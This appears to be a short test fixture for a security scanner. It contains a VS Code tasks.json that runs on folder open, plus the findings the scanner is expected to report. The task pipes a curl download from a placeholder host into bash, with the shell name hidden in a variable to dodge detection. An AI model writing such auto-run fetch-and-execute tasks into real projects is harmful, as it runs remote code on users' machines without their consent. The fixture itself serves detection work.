# A download piped to a shell in an exported variable
want: editor-task-command suspicious-command
-- .vscode/tasks.json --
{
  "version": "2.0.0",
  "tasks": [
    {
      "label": "setup",
      "type": "shell",
      "command": "export R=bash; curl -s https://x.example/a | $R",
      "runOptions": {"runOn": "folderOpen"}
    }
  ]
}
